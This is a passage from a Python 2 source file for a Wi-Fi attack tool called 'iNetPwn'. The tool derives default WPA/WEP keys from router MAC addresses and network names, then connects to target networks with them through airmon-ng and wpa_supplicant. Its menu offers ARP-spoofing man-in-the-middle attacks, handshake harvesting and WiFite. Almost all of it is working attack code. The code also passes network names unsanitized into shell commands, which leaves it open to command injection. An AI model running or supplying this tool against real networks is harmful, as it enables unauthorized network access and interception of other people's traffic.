            Scramble8 = MAC8[2][1] + MAC8[0][1] + MAC8[1][0] + MAC8[3][1] + MAC8[2][0] + MAC8[0][0] + MAC8[3][0] + MAC8[1][1]
            for char in Scramble8:
                WPA_WEP_Key += ConversionChart[1][ConversionChart[0].index(char)]
        elif len(ESSID) == 11 or len(ESSID) == 13:
            MAC8 = BSSID.split(":")[-4:]
            if "belkin" in ESSID: MAC8[3] = hex(int(MAC8[3], base=16) + 1)[2:].upper()
            else: ConversionChart = ("0123456789ABCDEF", "024613578ACE9BDF")
            Scramble8 = MAC8[2][1] + MAC8[0][1] + MAC8[1][0] + MAC8[3][1] + MAC8[2][0] + MAC8[0][0] + MAC8[3][0] + MAC8[1][1]
            for char in Scramble8:
                WPA_WEP_Key += ConversionChart[1][ConversionChart[0].index(char)]
        elif len(ESSID) == 14: WPA_WEP_Key = "".join(BSSID.split(":")[2:])
        return WPA_WEP_Key

    def CreateProfilesDir(self):
        if not os.path.isdir("profiles"): os.system("mkdir profiles")

    def Test_WPA_WEP_Key(self, wlanx, BSSID, ESSID, Encryption, WPA_WEP_Key):
        try:
            self.CreateProfilesDir()
            print; os.system("airmon-ng check kill"); print; os.system("airmon-ng check kill"); print
            os.system("ifconfig %s down; ifconfig %s up" % tuple([wlanx] * 2))
            os.system("iwconfig %s essid ''; iwconfig %s essid '%s'; iwconfig %s essid '%s' ap %s" % (wlanx, wlanx, ESSID, wlanx, ESSID, BSSID))
            if Encryption == "WPA2" and WPA_WEP_Key:
                os.system("wpa_passphrase '%s' > profiles/%s.conf '%s'" % (ESSID, ESSID.replace(" ","_").replace("-", "_"), WPA_WEP_Key))
                os.system("wpa_supplicant -B -f profiles/wpa_supplicant.txt -i%s -cprofiles/%s.conf; sleep 15" % (wlanx, ESSID.replace(" ", "_").replace("-", "_")))
                wpa_supplicant = open("profiles/wpa_supplicant.txt", "r").read(); print wpa_supplicant
                wpa_supplicant = " ".join(wpa_supplicant.split())
                os.system("rm profiles/wpa_supplicant.txt")
                if "Connection to %s completed" % BSSID.lower() not in wpa_supplicant:
                    print "\n%sTest_WPA_WEP_Key Error: WRONG KEY%s\n" % (Colors["red"], Colors["end"])
                    return False
            if Encryption == "WEP" and WPA_WEP_Key: os.system("iwconfig %s essid '%s' key %s" % (wlanx, ESSID, WPA_WEP_Key))

            print "\n\tObtaining I.P. Address..."
            os.system("dhclient %s > profiles/dhclient.txt 2>&1; rm profiles/dhclient.txt" % wlanx)
            BSSID = MyNetwork().BSSID(wlanx); ESSID = MyNetwork().ESSID(wlanx)
            print "\nWifi Network Name (ESSID): %s\nAccess Point (BSSID): %s" % (Colors["blue"] + ESSID + Colors["end"], Colors["magenta"] + BSSID + Colors["end"]) if ESSID and BSSID else "\nFailed To Establish Connection...\n"
            Local_IP = MyNetwork().Local_IP(wlanx); Public_IP = MyNetwork().Public_IP()
            if Local_IP and Public_IP:
                print "Local I.P. Address: %s" % Colors["cyan"] + Local_IP + Colors["end"]
                print "Public I.P. Address: %s" % Colors["red"] + Public_IP + Colors["end"]
                return True
            os.system("service network-manager stop && service network-manager start")
        except KeyboardInterrupt:
            print; print; quit()
        except:
            raise
        return False

if __name__ == "__main__":
    os.system("clear")
    while True:
        try:
            print "%s  .;'                     `;,  " % (" " * 16)
            print "%s .;'  ,;'             `;,  `;, " % (" " * 16)
            print "%s.;'  ,;'  ,;'     `;,  `;,  `;," % (" " * 16)
            print "%s::   ::   :   ( )   :   ::   ::" % (" " * 16)
            print "%s':.  ':.  ':. /_\ ,:'  ,:'  ,:'" % (" " * 16)
            print "%s ':.  ':.    /___\    ,:'  ,:' " % (" " * 16)
            print "%s  ':.       /_____\      ,:'   " % (" " * 16)
            print "%s           /       \           " % (" " * 16)
            print "-" * 62; print (" " * 18) + Colors["red"] + "iNetPwn (c) Sc0rp10 2018" + Colors["end"]; print "-" * 62; print
            print "   1.  WiFi Penetration Test & Analysis"
            print "   2.  My Local Network Info"
            print "   3.  Perform Man in The Middle Attack (MITMA)"
            print "   4.  WiFi Passive Listener"
            print "   5.  NetXML Parser"
            print "   6.  Handshake Harvester"
            print "   7.  WiFite v2 (r87)"
            print
            print "   9.  Reset Network Manager & Wireless Interfaces"
            print
            x = raw_input("Select Option: ")
            if x == "1":
                wlanx = AirCrack().SelectInterface()
                if wlanx: AirCrack().WirelessOptions(AirCrack().SelectNetwork(AirCrack().SortNetworks(AirCrack().NetXML_Parser(AirCrack().ScanNetworks(wlanx)))))
            elif x == "2":
                wlanx = AirCrack().SelectInterface()
                if wlanx: MyNetwork().Local_Devices(wlanx)
            elif x == "3":
                wlanx = AirCrack().SelectInterface()
                if wlanx: Local_Devices = MyNetwork().Local_Devices(wlanx)
                if Local_Devices: Target_Device = MyNetwork().Select_Local_Device(Local_Devices)
                print "\n\tSelect Wireless Interface w/ Packet Sniffing Capabilities\n"
                wlanx = AirCrack().SelectInterface()
                if Target_Device: ArpSpoof().Attack(wlanx, Target_Device)
            elif x == "4":
                wlanx = AirCrack().SelectInterface()
                AirCrack().AirSniff(wlanx)
            elif x == "5":
                wlanx = AirCrack().SelectInterface()
                netxml_files = AirCrack().Select_NetXMLs()
                tmp_file = "netxml/tmp.netxml"
                os.system("cat '%s' > '%s'" % (" ".join(netxml_files), tmp_file))
                AirCrack().SelectNetwork(AirCrack().SortNetworks(AirCrack().NetXML_Parser(tmp_file)))
                os.system("rm '%s'" % tmp_file)
            elif x == "6":
                wlanx = AirCrack().SelectInterface()
                AirCrack().HandshakeHarvest(wlanx)
            elif x == "7": os.system("wifite")
            elif x == "9":
                os.system("airmon-ng | grep wlan > airmon-ng_wlanx.txt")
                airmon_txt = open("airmon-ng_wlanx.txt", "r"); os.system("rm airmon-ng_wlanx.txt")
                for line in airmon_txt:
                    if "mon" in line.split()[1]: os.system("airmon-ng stop %s" % line.split()[1])
                    os.system("ifconfig %s down; ifconfig %s up" % tuple([line.split()[1].replace("mon", "")] * 2))
                os.system("airmon-ng check kill 2>&1; service network-manager stop; service network-manager start;")
            print
        except KeyboardInterrupt:
            print; print; quit()
        except: raise
